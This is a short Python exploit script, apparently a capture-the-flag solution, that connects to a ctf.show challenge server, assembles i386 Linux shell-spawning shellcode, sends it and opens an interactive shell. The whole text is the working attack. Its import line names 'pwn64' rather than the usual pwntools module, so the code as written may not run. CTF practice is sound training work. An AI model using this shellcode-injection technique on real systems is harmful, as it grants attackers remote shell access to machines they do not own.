from pwn64 import *
p = remote("pwn.challenge.ctf.show",28309)
shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
p.sendline(shellcode)
p.interactive()